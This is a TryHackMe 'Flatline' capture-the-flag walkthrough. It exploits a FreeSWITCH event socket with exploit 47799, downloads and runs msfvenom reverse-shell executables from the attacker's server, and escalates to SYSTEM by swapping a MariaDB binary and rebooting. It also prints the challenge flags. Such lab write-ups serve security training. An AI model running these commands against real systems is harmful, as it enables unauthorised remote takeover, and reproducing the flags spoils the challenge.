
# Flatline -TryHackMe

>## RjRaju

# Nmap scan
```
# Nmap 7.92 scan initiated Sat Feb 26 18:00:29 2022 as: nmap -sC -sV -A -Pn -oN nmap.log -vv 10.10.70.48
Nmap scan report for 10.10.70.48
Host is up, received user-set (0.20s latency).
Scanned at 2022-02-26 18:00:30 EST for 27s
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE          REASON  VERSION
3389/tcp open  ms-wbt-server    syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-EOM4PK0578N
|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
|   DNS_Domain_Name: WIN-EOM4PK0578N
|   DNS_Computer_Name: WIN-EOM4PK0578N
|   Product_Version: 10.0.17763
|_  System_Time: 2022-02-26T07:00:36+00:00
| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
| Issuer: commonName=WIN-EOM4PK0578N
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-08T16:47:35
| Not valid after:  2022-05-10T16:47:35
| MD5:   6190 7ede 74c9 0701 1160 e36b 2f39 b580
| SHA-1: f3b6 a09c 7ee5 1abd cdbb 03f5 2c63 3e19 6974 659b
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQXDeP1CLg17JO48/W76i0KzANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9XSU4tRU9NNFBLMDU3OE4wHhcNMjExMTA4MTY0NzM1WhcNMjIw
| NTEwMTY0NzM1WjAaMRgwFgYDVQQDEw9XSU4tRU9NNFBLMDU3OE4wggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDL7cn7UF+DQHuhTJbAfhqR8XMjvt2maC/u
| /q2ZuuoCesWamyIIO1Zh0avn0b/PblDllmdJYlXSoTMA/Vp3Ivv2iRqWHmayboXJ
| WoCdwZVIPR2lUsdAqLumWJqpwFTEsLAPnPPf8+qkrDZcU9ODBS7Ylaytp4Bi37b7
| fGhxEzz4lMRnjXFQhvOlkKSbnyLR40hc9BBLoRB7xrMSSe7tNzqT8MJRX2PGsSyS
| 0FKXnb9845OdYxyj9bey5bje24Tn3v/jDsVQF3Eg1YBZ41559QFPADAqQViszdfG
| hahEdyAfFvL50Wbr0Ql8EzqXha5Fn65+EbXRI4HIyhnXE0sHLQsxAgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAlTOaIMVmLC3ey7UxLnB4oFeiYO/EA4axDmgUTXbQpYHdtMPtw1Rd2cSW
| PCZv7Zo5AZuH04g5UZm1W4wLCxleYpfNSsDcSy7yZmGqkhCCHMQRagEvBtDFkcbZ
| Frc6NW2UACE+Y5j4VeiihPFl2bZk4D97O/C6n21XBYeO6BK83wDxni39QG9H+r5/
| qgVrOPcSpyH8jwwfxzuxVNMFgmlVxQWpPmw6n5nX3MdtoIv0hk+XlU7e4K/MU670
| TIzBvqi23ufeMKwr7ROhiBqj4Najbig4cmHT6vNLasFVAlS7IDlYEPQs7XxAZd+L
| ZYBTmjO8tjMZbckOdtXGjjnYHDcFhw==
|_-----END CERTIFICATE-----
|_ssl-date: 2022-02-26T07:00:38+00:00; -16h00m19s from scanner time.
8021/tcp open  freeswitch-event syn-ack FreeSWITCH mod_event_socket
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -16h00m19s, deviation: 0s, median: -16h00m19s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 26 18:00:57 2022 -- 1 IP address (1 host up) scanned in 27.66 seconds
```
# Searchsploit
-  Exploit Found 47799.txt
```
$ searchsploit freeswitch      
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
FreeSWITCH - Event Socket Command Execution (Metasploit)               | multiple/remote/47698.rb
FreeSWITCH 1.10.1 - Command Execution                                  | windows/remote/47799.txt
----------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

# Exploit 4499.py

```
$ ./47799.py 10.10.70.48 whoami
Authenticated
Content-Type: api/response
Content-Length: 25

win-eom4pk0578n\nekrotic
$
```
# Create a revershell payload
```
$ msfvenom -p windows/shell_reverse_tcp LHOST=$VPNIP LPORT=4444 -f exe > shell.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```
# Upload & run revershell payload

```
$ ls
shell.exe

$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.70.48 - - [26/Feb/2022 18:11:57] "GET /shell.exe HTTP/1.1" 200 -

```
```
$ ./47799.py 10.10.70.48 "powershell.exe Invoke-WebRequest -Uri http://$VPNIP:8000/shell.exe -OutFile ./shell.exe && .\shell.exe" 
Authenticated

```

# Start netcat listener

```
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [$VPNIP] from (UNKNOWN) [10.10.70.48] 49803
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\FreeSWITCH>whoami
whoami
win-eom4pk0578n\nekrotic

C:\Program Files\FreeSWITCH>cd ../../
cd ../../

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 84FD-2CC9

 Directory of C:\

15/09/2018  07:19    <DIR>          PerfLogs
09/11/2021  16:41    <DIR>          Program Files
09/11/2021  07:13    <DIR>          Program Files (x86)
09/11/2021  07:18    <DIR>          projects
09/11/2021  07:28    <DIR>          Users
09/11/2021  16:47    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  50,540,109,824 bytes free

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 84FD-2CC9

 Directory of C:\Users

09/11/2021  07:28    <DIR>          .
09/11/2021  07:28    <DIR>          ..
09/11/2021  07:13    <DIR>          Administrator
09/11/2021  07:37    <DIR>          Nekrotic
09/11/2021  07:13    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  50,540,109,824 bytes free

C:\Users>cd Nekrotic
cd Nekrotic

C:\Users\Nekrotic>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 84FD-2CC9

 Directory of C:\Users\Nekrotic

09/11/2021  16:50    <DIR>          .
09/11/2021  16:50    <DIR>          ..
09/11/2021  07:31    <DIR>          3D Objects
09/11/2021  07:31    <DIR>          Contacts
09/11/2021  07:39    <DIR>          Desktop
09/11/2021  07:31    <DIR>          Documents
09/11/2021  07:31    <DIR>          Downloads
09/11/2021  07:31    <DIR>          Favorites
09/11/2021  07:31    <DIR>          Links
09/11/2021  07:31    <DIR>          Music
09/11/2021  07:31    <DIR>          Pictures
09/11/2021  07:31    <DIR>          Saved Games
09/11/2021  07:31    <DIR>          Searches
09/11/2021  07:31    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  50,540,109,824 bytes free

C:\Users\Nekrotic>cd Desktop	
cd Desktop

C:\Users\Nekrotic\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 84FD-2CC9

 Directory of C:\Users\Nekrotic\Desktop

09/11/2021  07:39    <DIR>          .
09/11/2021  07:39    <DIR>          ..
09/11/2021  07:39                38 root.txt
09/11/2021  07:39                38 user.txt
               2 File(s)             76 bytes
               2 Dir(s)  50,540,109,824 bytes free

C:\Users\Nekrotic\Desktop>type user.txt
type user.txt
THM{64bca0843d535fa73eecdc59d27cbe26} 
C:\Users\Nekrotic\Desktop>type root.txt
type root.txt
Access is denied.

C:\Users\Nekrotic\Desktop>
```

# Privilege Escalation 

## Attacking Machine
### Create a another reverseshell payload for privilege escalation
```
$ msfvenom -p windows/shell_reverse_tcp LHOST=$VPNIP LPORT=4445  -f exe > mysqld.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```
```
$ ls 
47799.py  mysqld.exe  shell.exe

$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

## Start Listener
```
$ nc -lvnp 4445
listening on [any] 4445 ...
```

# Victim Machine

```
C:\Users\Nekrotic\Desktop>cd C:\projects\openclinic\mariadb\bin 
cd C:\projects\openclinic\mariadb\bin 

C:\projects\openclinic\mariadb\bin>ren "mysqld.exe" "mysqld_bak.exe"
ren "mysqld.exe" "mysqld_bak.exe"

C:\projects\openclinic\mariadb\bin>curl http://10.17.41.93:8000/mysqld.exe -o "C:\projects\openclinic\mariadb\bin\mysqld.exe"
curl http://10.17.41.93:8000/mysqld.exe -o "C:\projects\openclinic\mariadb\bin\mysqld.exe"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 73802  100 73802    0     0  73802      0  0:00:01 --:--:--  0:00:01 90777

C:\projects\openclinic\mariadb\bin>shutdown /r /t 1 
shutdown /r /t 1 

C:\projects\openclinic\mariadb\bin>

```
# Privilege Shell
-  wait for 1+ min to get Privilege reverse shell
```
$ nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.17.41.93] from (UNKNOWN) [10.10.70.48] 49669
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd ../../../
cd ../../../

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 84FD-2CC9

 Directory of C:\Users

09/11/2021  07:28    <DIR>          .
09/11/2021  07:28    <DIR>          ..
09/11/2021  07:13    <DIR>          Administrator
09/11/2021  07:37    <DIR>          Nekrotic
09/11/2021  07:13    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  50,504,314,880 bytes free

C:\Users>cd Nekrotic
cd Nekrotic

C:\Users\Nekrotic>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 84FD-2CC9

 Directory of C:\Users\Nekrotic

09/11/2021  16:50    <DIR>          .
09/11/2021  16:50    <DIR>          ..
09/11/2021  07:31    <DIR>          3D Objects
09/11/2021  07:31    <DIR>          Contacts
09/11/2021  07:39    <DIR>          Desktop
09/11/2021  07:31    <DIR>          Documents
09/11/2021  07:31    <DIR>          Downloads
09/11/2021  07:31    <DIR>          Favorites
09/11/2021  07:31    <DIR>          Links
09/11/2021  07:31    <DIR>          Music
09/11/2021  07:31    <DIR>          Pictures
09/11/2021  07:31    <DIR>          Saved Games
09/11/2021  07:31    <DIR>          Searches
09/11/2021  07:31    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  50,504,314,880 bytes free

C:\Users\Nekrotic>cd Desktop
cd Desktop

C:\Users\Nekrotic\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 84FD-2CC9

 Directory of C:\Users\Nekrotic\Desktop

09/11/2021  07:39    <DIR>          .
09/11/2021  07:39    <DIR>          ..
09/11/2021  07:39                38 root.txt
09/11/2021  07:39                38 user.txt
               2 File(s)             76 bytes
               2 Dir(s)  50,504,314,880 bytes free

C:\Users\Nekrotic\Desktop>type user.txt
type user.txt
THM{64bca0843d535fa73eecdc59d27cbe26} 

C:\Users\Nekrotic\Desktop>
C:\Users\Nekrotic\Desktop>type root.txt
type root.txt
THM{8c8bc5558f0f3f8060d00ca231a9fb5e} 
C:\Users\Nekrotic\Desktop>
```

# COMPLETED :)



